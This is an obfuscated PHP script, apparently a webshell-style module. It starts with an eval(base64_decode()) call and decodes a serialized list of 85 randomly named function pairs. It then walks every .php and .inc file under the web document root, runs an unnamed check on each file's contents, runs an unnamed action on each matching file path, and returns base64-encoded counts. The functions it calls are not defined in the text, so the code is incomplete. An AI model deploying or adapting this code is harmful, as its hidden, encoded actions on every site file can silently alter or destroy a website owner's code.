eval(base64_decode(""));
$defs = unserialize(base64_decode("YTo4NTp7aTowO2E6Mzp7aTowO2k6MjtpOjE7czo0OiJyZGRnIjtpOjI7czo0OiJndmR5Ijt9aToxO2E6Mzp7aTowO2k6NTtpOjE7czoxMDoicmtxZXdzdWhybiI7aToyO3M6OToiZ213dHdvemFqIjt9aToyO2E6Mzp7aTowO2k6MTU7aToxO3M6OToicmp3YXl0eW14IjtpOjI7czo3OiJna2NzdGtkIjt9aTozO2E6Mzp7aTowO2k6MTg7aToxO3M6NzoicnVrdnZqbSI7aToyO3M6NDoiZ29yZyI7fWk6NDthOjM6e2k6MDtpOjIzO2k6MTtzOjc6InJpYnltdW0iO2k6MjtzOjEwOiJncHFraWlhcnZyIjt9aTo1O2E6Mzp7aTowO2k6MzY7aToxO3M6Nzoicm1vYXVrayI7aToyO3M6MTA6Imdzd3d2cnhyZHQiO31pOjY7YTozOntpOjA7aTo0MjtpOjE7czo1OiJyaHdweiI7aToyO3M6NzoiZ3ByamZvbCI7fWk6NzthOjM6e2k6MDtpOjU0O2k6MTtzOjExOiJycmlrYmRxanp1diI7aToyO3M6MTA6ImdkbXhuZWhlcGgiO31pOjg7YTozOntpOjA7aTo2MDtpOjE7czo3OiJyY2tieXd3IjtpOjI7czo4OiJncXpjdXBvdiI7fWk6OTthOjM6e2k6MDtpOjg5O2k6MTtzOjc6InJ6c29kcnkiO2k6MjtzOjEwOiJnY3d3cmlzaWV4Ijt9aToxMDthOjM6e2k6MDtpOjEwOTtpOjE7czo5OiJyem9neXZyeHIiO2k6MjtzOjU6ImdrbG16Ijt9aToxMTthOjM6e2k6MDtpOjExMDtpOjE7czo5OiJyeGJseWdyYnoiO2k6MjtzOjg6Imdyb3VrdXR0Ijt9aToxMjthOjM6e2k6MDtpOjExMTtpOjE7czo5OiJycWlqempjamMiO2k6MjtzOjU6ImdvZ2FzIjt9aToxMzthOjM6e2k6MDtpOjExMjtpOjE7czo0OiJyaGpnIjtpOjI7czo2OiJnZGJwZXoiO31pOjE0O2E6Mzp7aTowO2k6MTE1O2k6MTtzOjU6InJoY2NqIjtpOjI7czo1OiJneWJ0ZSI7fWk6MTU7YTozOntpOjA7aToxMTg7aToxO3M6NToicmJlcWkiO2k6MjtzOjg6ImdieGdldG9zIjt9aToxNjthOjM6e2k6MDtpOjEyNjtpOjE7czo3OiJyaWZ2a3ZvIjtpOjI7czoxMDoiZ292aWpkaXVpZiI7fWk6MTc7YTozOntpOjA7aToxMjc7aToxO3M6NzoicmRlZ2VsaiI7aToyO3M6NzoiZ2hrcGl6diI7fWk6MTg7YTozOntpOjA7aToxMzA7aToxO3M6MTA6InJyZWxxeXJhZW4iO2k6MjtzOjg6ImdqZHl5dXhyIjt9aToxOTthOjM6e2k6MDtpOjEzNDtpOjE7czo1OiJyaHNwbCI7aToyO3M6NzoiZ251bXluYSI7fWk6MjA7YTozOntpOjA7aToxMzg7aToxO3M6OToicm10eGp2dnVjIjtpOjI7czo2OiJnZHppdWMiO31pOjIxO2E6Mzp7aTowO2k6MTQ4O2k6MTtzOjk6InJ5d3Vrd2NmbiI7aToyO3M6NToiZ3Zwam4iO31pOjIyO2E6Mzp7aTowO2k6MTU3O2k6MTtzOjg6InJla2xyeHFqIjtpOjI7czo1OiJnY3Z1ayI7fWk6MjM7YTozOntpOjA7aToxNjM7aToxO3M6NjoicmltYnZzIjtpOjI7czo2OiJnemJueXQiO31pOjI0O2E6Mzp7aTowO2k6MTcyO2k6MTtzOjc6InJyb3BzZGwiO2k6MjtzOjY6ImdoaGdiYyI7fWk6MjU7YTozOntpOjA7aToxNzQ7aToxO3M6ODoicm9pY252ZHkiO2k6MjtzOjEwOiJncnNyeW5ic2F1Ijt9aToyNjthOjM6e2k6MDtpOjE3OTtpOjE7czo2OiJya3pqaG4iO2k6MjtzOjY6Imdta2VxcCI7fWk6Mjc7YTozOntpOjA7aToxODc7aToxO3M6OToicmFwenVmcmh1IjtpOjI7czo5OiJnd3F5aWVzb3QiO31pOjI4O2E6Mzp7aTowO2k6MTg5O2k6MTtzOjk6InJtbm9hZGt6ayI7aToyO3M6NjoiZ2twZW51Ijt9aToyOTthOjM6e2k6MDtpOjE5MjtpOjE7czoxMDoicmdzbWxuaHFwdyI7aToyO3M6NjoiZ3BkcGtpIjt9aTozMDthOjM6e2k6MDtpOjE5NjtpOjE7czo4OiJyeHFwbmJiZCI7aToyO3M6MTE6Imd6dXN1bHpkcm9uIjt9aTozMTthOjM6e2k6MDtpOjE5ODtpOjE7czo2OiJyeGVzdGoiO2k6MjtzOjEwOiJnb3NlYmViZGZuIjt9aTozMjthOjM6e2k6MDtpOjE5OTtpOjE7czo5OiJyanl5cHFhd3UiO2k6MjtzOjExOiJnd3RyeGVxZmlkeSI7fWk6MzM7YTozOntpOjA7aToyMDA7aToxO3M6Nzoicm9zaGNyaCI7aToyO3M6NzoiZ2Z2aXdzZSI7fWk6MzQ7YTozOntpOjA7aToyMDE7aToxO3M6MTE6InJ4dW1tZmh6a2FyIjtpOjI7czo3OiJneGlqYWxyIjt9aTozNTthOjM6e2k6MDtpOjIwMztpOjE7czo3OiJyaWxlYmR1IjtpOjI7czo4OiJnc2xiaG1idyI7fWk6MzY7YTozOntpOjA7aToyMDY7aToxO3M6NToicmtkenIiO2k6MjtzOjc6Imd2b29qZHYiO31pOjM3O2E6Mzp7aTowO2k6MjA5O2k6MTtzOjQ6InJ3dnoiO2k6MjtzOjg6Imduc3Bua2RkIjt9aTozODthOjM6e2k6MDtpOjIxMDtpOjE7czo5OiJyeGF5bHRteXciO2k6MjtzOjExOiJnb3dqYWRjYmNhaCI7fWk6Mzk7YTozOntpOjA7aToyMTI7aToxO3M6Njoicmdsa2d1IjtpOjI7czoxMDoiZ29xa2ZmenFmZyI7fWk6NDA7YTozOntpOjA7aToyMTM7aToxO3M6ODoicnV5dnphbm4iO2k6MjtzOjk6ImdzcWZueGd5aSI7fWk6NDE7YTozOntpOjA7aToyMTQ7aToxO3M6NDoicm5xdCI7aToyO3M6NjoiZ2xpYmVuIjt9aTo0MjthOjM6e2k6MDtpOjIxNTtpOjE7czo1OiJyeXNndyI7aToyO3M6OToiZ3ZmZ3hzbmNuIjt9aTo0MzthOjM6e2k6MDtpOjIxNjtpOjE7czoxMToicnNqcG91amVlcmYiO2k6MjtzOjU6Imd0dHhqIjt9aTo0NDthOjM6e2k6MDtpOjIxNztpOjE7czoxMToicmp1aXZ3aWVndHMiO2k6MjtzOjY6ImdweXpmdSI7fWk6NDU7YTozOntpOjA7aToyMTg7aToxO3M6NToicnJ6ZHYiO2k6MjtzOjU6ImdlZnB5Ijt9aTo0NjthOjM6e2k6MDtpOjIyMTtpOjE7czo3OiJyYm90dXF4IjtpOjI7czo4OiJnd3F5eWdxZSI7fWk6NDc7YTozOntpOjA7aToyMjI7aToxO3M6NToicnR1bWUiO2k6MjtzOjEwOiJnc29tdWJ4bnljIjt9aTo0ODthOjM6e2k6MDtpOjIyMztpOjE7czo5OiJyZHRuYnd0b3YiO2k6MjtzOjk6ImdhaHF5aWh0cCI7fWk6NDk7YTozOntpOjA7aToyMjQ7aToxO3M6NToicmZpcHEiO2k6MjtzOjk6Imd3bmlmZWt3ZSI7fWk6NTA7YTozOntpOjA7aToyMjU7aToxO3M6ODoicnJ6bW10b3kiO2k6MjtzOjEwOiJneXJyaHFraHhrIjt9aTo1MTthOjM6e2k6MDtpOjIzMDtpOjE7czo3OiJyYnJ5YXd4IjtpOjI7czoxMToiZ2h0YmFjZWVneG4iO31pOjUyO2E6Mzp7aTowO2k6MjMyO2k6MTtzOjY6InJkb255byI7aToyO3M6MTE6ImdxdWFkcW5jcnpkIjt9aTo1MzthOjM6e2k6MDtpOjIzNTtpOjE7czo0OiJyc2N2IjtpOjI7czo1OiJneXhmdSI7fWk6NTQ7YTozOntpOjA7aToyMzY7aToxO3M6MTE6InJ4YXR4dmxzYXFkIjtpOjI7czo0OiJncnVqIjt9aTo1NTthOjM6e2k6MDtpOjIzNztpOjE7czo4OiJya3JpaGd6ZCI7aToyO3M6MTA6ImdqdmVxZm51cnQiO31pOjU2O2E6Mzp7aTowO2k6MjM4O2k6MTtzOjQ6InJub20iO2k6MjtzOjQ6ImdhdXkiO31pOjU3O2E6Mzp7aTowO2k6MjM5O2k6MTtzOjc6InJkaG53angiO2k6MjtzOjQ6Imd3anYiO31pOjU4O2E6Mzp7aTowO2k6MjQwO2k6MTtzOjY6InJ4dGpibyI7aToyO3M6MTA6ImdpcnZ1bHd5a2UiO31pOjU5O2E6Mzp7aTowO2k6MjQxO2k6MTtzOjQ6InJxcXciO2k6MjtzOjU6Imdsc3h2Ijt9aTo2MDthOjM6e2k6MDtpOjI0MjtpOjE7czo4OiJyZG5zZW1sciI7aToyO3M6OToiZ3F3cXZxYmlyIjt9aTo2MTthOjM6e2k6MDtpOjI0MztpOjE7czo0OiJyYWVzIjtpOjI7czo0OiJnZmJ0Ijt9aTo2MjthOjM6e2k6MDtpOjI0NDtpOjE7czo5OiJyeGtnZ251ZWciO2k6MjtzOjU6ImdscXh1Ijt9aTo2MzthOjM6e2k6MDtpOjI0NTtpOjE7czo4OiJyaGRvam1vcCI7aToyO3M6NToiZ2xldnkiO31pOjY0O2E6Mzp7aTowO2k6MjQ2O2k6MTtzOjEwOiJyamRqeG9sYmZmIjtpOjI7czo2OiJndHNidWoiO31pOjY1O2E6Mzp7aTowO2k6MjQ3O2k6MTtzOjEwOiJydmVoeHN1aGZwIjtpOjI7czo3OiJnZ2Jzdnp0Ijt9aTo2NjthOjM6e2k6MDtpOjI0ODtpOjE7czo0OiJyZG1lIjtpOjI7czo4OiJnbmRtYnN5aCI7fWk6Njc7YTozOntpOjA7aToyNDk7aToxO3M6NDoicnR0bCI7aToyO3M6NjoiZ2pidHR2Ijt9aTo2ODthOjM6e2k6MDtpOjI1MDtpOjE7czoxMDoicmdkaWJhZWhkaCI7aToyO3M6NDoiZ2ZlYiI7fWk6Njk7YTozOntpOjA7aToyNTE7aToxO3M6OToicmNwdXp1ZmFyIjtpOjI7czo5OiJnZm56b2FscHciO31pOjcwO2E6Mzp7aTowO2k6MjUyO2k6MTtzOjg6InJ4cG5zZXBwIjtpOjI7czo5OiJnbGVvbnZweXAiO31pOjcxO2E6Mzp7aTowO2k6MjUzO2k6MTtzOjY6InJkamxjbSI7aToyO3M6MTA6Imd0eG1oc2t6dHAiO31pOjcyO2E6Mzp7aTowO2k6MjU0O2k6MTtzOjY6InJlcmpkdyI7aToyO3M6MTE6ImdqcGZoZWZrd2RrIjt9aTo3MzthOjM6e2k6MDtpOjI1NTtpOjE7czoxMToicmxmZmtzb2FmZGsiO2k6MjtzOjY6Imd1bmJ1eiI7fWk6NzQ7YTozOntpOjA7aToyNTY7aToxO3M6NDoicnBqcCI7aToyO3M6OToiZ2tsdHVnY3d3Ijt9aTo3NTthOjM6e2k6MDtpOjI1NztpOjE7czo3OiJybHNxaWpiIjtpOjI7czo2OiJncGF4ZnkiO31pOjc2O2E6Mzp7aTowO2k6MjU4O2k6MTtzOjExOiJyem1qeWl5dW1jYiI7aToyO3M6NToiZ2VjY2IiO31pOjc3O2E6Mzp7aTowO2k6MjU5O2k6MTtzOjg6InJldGZweXVwIjtpOjI7czoxMDoiZ3phbWh5Y21heSI7fWk6Nzg7YTozOntpOjA7aToyNjA7aToxO3M6NjoicmNneGNxIjtpOjI7czo0OiJnZ3lwIjt9aTo3OTthOjM6e2k6MDtpOjI2MTtpOjE7czo5OiJycm5sdGh3ZW4iO2k6MjtzOjY6Imd3bWxhZiI7fWk6ODA7YTozOntpOjA7aToyNjI7aToxO3M6Njoicmpuem51IjtpOjI7czo5OiJncmhlcWl4eGoiO31pOjgxO2E6Mzp7aTowO2k6MjYzO2k6MTtzOjc6InJhYnRkdXYiO2k6MjtzOjU6Imd5bGpoIjt9aTo4MjthOjM6e2k6MDtpOjI2NDtpOjE7czoxMDoicm1rYmRxYWVucCI7aToyO3M6MTA6ImdkbmJiemZrZmIiO31pOjgzO2E6Mzp7aTowO2k6MjY1O2k6MTtzOjY6InJmbnlrYiI7aToyO3M6NToiZ2lqc3giO31pOjg0O2E6Mzp7aTowO2k6MjY2O2k6MTtzOjc6InJldGJra20iO2k6MjtzOjU6Imd5cnF5Ijt9fQ=="));

function GetDocRoot()
{
    $docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($docroot_end === FALSE)
    {
        return $_SERVER['DOCUMENT_ROOT'];
    }
    elseif ($docroot_end === 0)
    {
        return "/";
    }
    else
    {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
    }
}

function GetFileList($dir, $depth=1000000000)
{
    $result = array();

    $dir_count = 0;

    if ($depth < 1) {
        return $result;
    }

    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE)
    {
        return $result;
    }

    while (($f = readdir($h)) !== FALSE)
    {
        if ($f !== '.' and $f !== '..')
        {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir))
            {
                $dir_count += 1;

                $result = array_merge($result, GetFileList($current_dir, $depth / 10));
            }
            else
            {
                $path_parts = pathinfo($current_dir);
                if (isset($path_parts['extension']) && ($path_parts['extension']=="php" || $path_parts['extension']=="inc"))
                {
                    $result[] = $current_dir;
                }

            }
        }
    }

    closedir($h);

    return $result;
}

$res = Array();
foreach(GetFileList(GetDocRoot()) as $path)
{
    $content = @file_get_contents($path);
    foreach($defs as $def_item)
    {
        if($def_item[1]($content))
        {
            if (!array_key_exists($def_item[0], $res))
            {
                $res[$def_item[0]] = 0;
            }
            
            $res[$def_item[0]] += 1;
            
            $def_item[2]($path);
        }
    }
}

echo base64_encode(serialize($res));
exit();